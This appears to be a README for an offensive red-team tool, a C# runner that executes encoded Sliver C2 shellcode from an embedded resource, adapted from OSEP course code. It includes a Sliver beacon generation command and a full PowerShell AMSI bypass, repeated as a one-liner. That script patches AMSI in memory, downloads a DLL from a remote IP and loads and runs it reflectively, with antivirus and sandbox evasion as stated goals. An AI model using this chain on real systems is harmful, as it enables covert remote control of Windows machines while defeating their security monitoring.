# Sliver_C-_Runner_Caesar

There is nothing special going on here; these are super basic methods.

## Introduction
This is a Digital Honk Project that illustrates cybersecurity techniques within Windows environments, showcasing shellcode execution from an embedded resource. A standout feature is its use of encoded payloads, which focus on evading detection through custom encoding schemes and AMSI bypass techniques. As the creator of the Payload-Encoder and an advocate for educational purposes, this project aims to deepen the understanding of cyber security mechanisms and ethical hacking practices. This is modified code from the OSEP course to execute Sliver Payloads.

### Key Features
- Shellcode execution from embedded resources in .NET applications.
- Custom payload encoding schemes are used to evade signature-based detection.
- Implementation of AMSI bypass techniques for unrestricted payload execution.
- Demonstrates evasion strategies to bypass sandbox detections.

## Getting Started

### Prerequisites
- A Windows environment (Windows 10/11 recommended).
- .NET Framework 4.7.2 or later.
- Visual Studio 2019 or later for development and compilation.

### Setup
1. **Generate Payload**: Use the Sliver C2 framework to generate your shellcode payload:
```
sliver> generate --mtls 192.168.45.221:8888 --os windows --arch amd64 --format shellcode --save beacon.bin
```
2. **Encode Payload**: With the Payload-Encoder tool, encode the `beacon.bin` file for embedding within the project:
The process is detailed at Payload-Encoder.
3. **Embed and Compile**: Include the encoded payload (`honk.user.dat`) as an embedded resource and compile the project using Visual Studio.

### Execution with AMSI Bypass
To execute the payload with an AMSI bypass, use the following PowerShell script, ensuring your environment permits script execution:
```powershell
try{
 [Ref].Assembly.GetTypes() | ? { $_.Name -like "*iUtils" } | % {
     ($c = $_).GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" } | % {
         $g = $_.GetValue($null);
         [IntPtr]$ptr = $g;
         [Int32[]]$buf = @(0);
         [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
     }
 };
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.233.137/honk.dll');
 $assem = [System.Reflection.Assembly]::Load($data);
 [honk.Program]::appleBits()
} catch {
 Write-Error "An error occurred: $_"
} finally {
 Write-Host "Press Enter to exit...";
 [Console]::ReadLine()
}
```

One Liner:
`try{[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}|%{($c=$_).GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}|%{$g=$_.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)}}; $data=(New-Object System.Net.WebClient).DownloadData('http://192.168.233.137/honk.dll'); $assem=[System.Reflection.Assembly]::Load($data); [honk.Program]::appleBits()}catch{Write-Error "An error occurred: $_"}finally{Write-Host "Press Enter to exit...";[Console]::ReadLine()}`

## Disclaimer

This project is designed for educational and ethical hacking purposes only. Ensure you have explicit authorization to test and use these techniques on any system. The creator and contributors of the Digital Honk Project assume no responsibility for misuse or damages caused by this project.

## License

This project is licensed under the MIT License - see the LICENSE file for details.
Acknowledgments

    Special thanks to the Sliver C2 framework for the payload generation capabilities.
    Gratitude to the cybersecurity community for the continuous exchange of knowledge and ethical hacking practices.
